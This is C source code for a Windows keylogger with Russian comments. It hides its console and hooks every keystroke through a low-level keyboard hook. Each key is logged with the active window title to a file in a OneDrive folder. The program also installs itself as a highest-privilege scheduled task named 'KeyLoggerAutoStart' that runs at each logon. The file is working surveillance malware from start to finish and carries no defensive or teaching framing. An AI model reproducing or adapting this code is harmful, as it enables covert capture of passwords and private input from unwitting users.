#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#define LOG_FILE_PATH "C:\\Users\\philip\\OneDrive\\Logs\\log.txt"
#define MAX_LOG_SIZE 1048576  // 1 MB
#define TASK_NAME "KeyLoggerAutoStart"

FILE* logFile;

// Получение полного пути к .exe
void getExecutablePath(char* buffer) {
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
}

// Проверка, существует ли задача автозапуска
int isTaskExists(const char* taskName) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "schtasks /Query /TN \"%s\" >nul 2>&1", taskName);
    return system(cmd) == 0;
}

// Установка задачи автозапуска
void createStartupTask() {
    if (!isTaskExists(TASK_NAME)) {
        char exePath[MAX_PATH];
        getExecutablePath(exePath);

        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN \"%s\" /TR \"%s\"", TASK_NAME, exePath);
        system(cmd);
    }
}

// Преобразование кода клавиши в строку
const char* getKeyName(int vkCode) {
    static char keyName[20];  // Статический массив для хранения строки (увеличено до 20 символов)
    switch (vkCode) {
    case VK_BACK: strcpy(keyName, "[BACKSPACE]"); break;
    case VK_TAB: strcpy(keyName, "[TAB]"); break;
    case VK_RETURN: strcpy(keyName, "[ENTER]"); break;
    case VK_SHIFT: strcpy(keyName, "[SHIFT]"); break;
    case VK_CONTROL: strcpy(keyName, "[CTRL]"); break;
    case VK_MENU: strcpy(keyName, "[ALT]"); break;
    case VK_ESCAPE: strcpy(keyName, "[ESC]"); break;
    case VK_SPACE: strcpy(keyName, "[SPACE]"); break;
    case VK_LEFT: strcpy(keyName, "[LEFT ARROW]"); break;
    case VK_RIGHT: strcpy(keyName, "[RIGHT ARROW]"); break;
    case VK_UP: strcpy(keyName, "[UP ARROW]"); break;
    case VK_DOWN: strcpy(keyName, "[DOWN ARROW]"); break;
    default:
        if (vkCode >= 0x30 && vkCode <= 0x5A) {
            keyName[0] = (char)vkCode;  // Записываем символ
            keyName[1] = '\0';  // Завершаем строку
        }
        else {
            strcpy(keyName, "[UNKNOWN]");
        }
        break;
    }
    return keyName;  // Возвращаем указатель на строку
}

// Получение названия активного окна
const char* getActiveWindowTitle() {
    static char title[256];
    HWND hwnd = GetForegroundWindow();
    if (GetWindowTextA(hwnd, title, sizeof(title))) {
        return title;
    }
    return "[Unknown Window]";
}

// Очистка лог-файла при превышении размера
void checkLogFileSize() {
    fseek(logFile, 0, SEEK_END);
    long size = ftell(logFile);
    if (size > MAX_LOG_SIZE) {
        freopen(LOG_FILE_PATH, "w", logFile);  // Очистка файла, если он слишком большой
    }
}

// Запись в лог
void logKey(int vkCode) {
    checkLogFileSize();

    if (logFile == NULL) return;

    const char* keyName = getKeyName(vkCode);
    const char* windowTitle = getActiveWindowTitle();
    fprintf(logFile, "Key Pressed: %s in Window: %s\n", keyName, windowTitle);
    fflush(logFile);  // Принудительная запись в файл
}

// Хук клавиш
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        logKey(pKeyboard->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Скрыть консоль
    FreeConsole();

    // Убедиться, что папка для логов существует
    CreateDirectoryA("C:\\Users\\philip\\OneDrive\\Logs", NULL);

    // Открыть лог-файл
    logFile = fopen(LOG_FILE_PATH, "a+");
    if (logFile == NULL) {
        MessageBoxA(NULL, "Ошибка открытия файла лога!", "Ошибка", MB_ICONERROR);
        return 1;
    }

    // Установка автозапуска через schtasks (если ещё не создан)
    createStartupTask();

    // Установка хука клавиатуры
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) {
        MessageBoxA(NULL, "Ошибка установки хука клавиатуры!", "Ошибка", MB_ICONERROR);
        return 1;
    }

    // Цикл обработки сообщений
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    fclose(logFile);
    return 0;
}
